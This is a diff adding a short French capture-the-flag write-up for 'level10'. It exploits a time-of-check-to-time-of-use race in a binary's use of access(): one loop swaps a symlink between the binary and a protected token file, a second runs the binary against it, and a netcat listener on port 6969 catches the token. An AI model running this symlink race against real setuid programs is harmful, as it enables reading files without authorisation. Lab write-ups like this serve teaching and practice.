@@ -1,0 +1,20 @@
+en faisant nm sur level10 on voit qu'il y a un appel a la commande access
+
+si on regarde le man 2 access en detail on voit que la commande est deconsseillé a cause 
+d'un temps qui permet l'exploitation pendant la commande.
+
+on peut alors exploiter access en faisant plusieurs boucle :
+
+ while true; do ln -fs ~/level10 /tmp/test; ln -fs ~/token /tmp/test; done
+une boucle qui crée et swap des liens symboliques entre une file et token,
+ce qui va nous permettre d'acceder a la file token avec les droits de la file echangée
+
+while true; do ./level10 /tmp/test 127.0.0.1; done
+
+une boucle qui lance en boucle le programme jusqu'a ce que l'intervalle de temps soit exploité
+
+on a juste ensuite a lancer netcat pour ecouter sur le port 6969 (strings level10 nous donne l'information)
+
+nc -lk 6969
+
+et au bout de quelques instants, nous avont le mot de passe pour flag11
